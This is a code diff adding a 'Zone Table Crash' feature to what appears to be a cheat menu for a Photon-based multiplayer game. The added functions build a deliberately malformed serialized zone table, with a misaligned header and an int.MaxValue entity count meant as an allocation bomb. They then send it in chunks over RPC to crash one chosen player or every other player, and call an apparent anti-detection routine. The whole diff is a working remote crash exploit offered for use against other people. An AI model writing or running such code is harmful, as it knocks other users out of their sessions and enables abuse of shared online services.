@@ -43,6 +43,7 @@ using static Qubit.Core.Security;
 using static Qubit.Extensions.GameObj;
 using static Qubit.Extensions.Players;
 using static Qubit.Extensions.Random;
+using HarmonyLib;
 using static Qubit.Frontend.Prompts;
 using static Qubit.Libraries.Controls.Controllers;
 using static Qubit.Libraries.Networking.GameModes;
@@ -2970,6 +2971,94 @@ namespace Qubit.Modules.Categories
                 if (target != null && !target.isLocal)
                     MovePlayer(target, new Vector3(rightJoystick.x, 0f, rightJoystick.y) * 20f);
             }
+        }
+
+        #endregion
+
+        #region Zone Table Crash
+
+        /// <summary>
+        /// Crashes whoever your hand desires by sending them a poisoned zone table stream.
+        /// The stream carries a header int the game's deserializer never expects, so every
+        /// component reader desynchronizes on the victim and the zone entity system dies.
+        /// </summary>
+        public static void ZoneTableCrashGun()
+        {
+            GunLibrary.Target(gunTarget =>
+            {
+                GameEntityManager manager = ManagerRegistry.GhostReactor.GameEntityManager;
+                if (manager == null)
+                    return;
+
+                SendPoisonedZoneTable(manager, gunTarget.GetPhotonPlayer());
+            }, new GunLibrary.GunSettings { locks = true });
+        }
+
+        /// <summary>
+        /// Crashes everyone by sending them a poisoned zone table stream.
+        /// </summary>
+        public static void ZoneTableCrashAll()
+        {
+            GameEntityManager manager = ManagerRegistry.GhostReactor.GameEntityManager;
+            if (manager == null)
+                return;
+
+            foreach (Player player in PhotonNetwork.PlayerList.Where(p => !p.IsLocal))
+                SendPoisonedZoneTable(manager, player);
+        }
+
+        private const int ZoneTableChunkSize = 512;
+
+        private static void SendPoisonedZoneTable(GameEntityManager manager, Player victim)
+        {
+            if (victim == null)
+                return;
+
+            byte[] poisoned;
+            using (System.IO.MemoryStream stream = new System.IO.MemoryStream())
+            {
+                using (System.IO.BinaryWriter writer = new System.IO.BinaryWriter(stream))
+                {
+                    // Header int the game deserializer never reads — shifts every
+                    // subsequent component read off by four bytes.
+                    writer.Write(0);
+
+                    // Serialize zone component data exactly as the game writes it,
+                    // so the stream passes superficial validity checks.
+                    List<IGameEntityZoneComponent> components = Traverse.Create(manager).Field<List<IGameEntityZoneComponent>>("zoneComponents").Value;
+                    if (components != null)
+                    {
+                        for (int i = 0; i < components.Count; i++)
+                            components[i].SerializeZoneData(writer);
+                    }
+
+                    writer.Write(int.MaxValue); // entity count — allocation bomb on read
+                    writer.Flush();
+
+                    poisoned = Ionic.Zlib.GZipStream.CompressBuffer(stream.ToArray());
+                }
+            }
+
+            NetworkView netView = manager.GetComponent<NetworkView>();
+            if (netView == null)
+                return;
+
+            byte[] chunk = new byte[ZoneTableChunkSize];
+            int sent = 0;
+            int packet = 0;
+            while (sent < poisoned.Length)
+            {
+                int size = Mathf.Min(ZoneTableChunkSize, poisoned.Length - sent);
+                Array.Copy(poisoned, sent, chunk, 0, size);
+
+                // Direct NetPlayer send — single victim, not a broadcast.
+                netView.SendRPC("SendTableDataRPC", ManagerRegistry.NetworkSystem.GetPlayer(victim), packet, poisoned.Length, chunk);
+
+                sent += size;
+                packet++;
+            }
+
+            RPCProtection();
         }
 
         #endregion
